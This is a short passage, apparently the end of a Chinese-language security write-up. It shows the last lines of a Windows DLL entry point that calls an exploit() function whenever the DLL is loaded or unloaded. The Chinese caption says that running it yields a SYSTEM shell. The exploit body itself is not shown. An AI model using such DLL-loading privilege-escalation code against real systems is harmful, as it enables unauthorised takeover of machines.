                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
`{`
    switch (ul_reason_for_call)
    `{`
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        exploit();
        break;
    `}`
    return TRUE;
`}`
```

如下图所示，运行时可以成功得到SYSTEM Shell：

[![](https://p2.ssl.qhimg.com/t0145d426429412f6f5.gif)](https://p2.ssl.qhimg.com/t0145d426429412f6f5.gif)
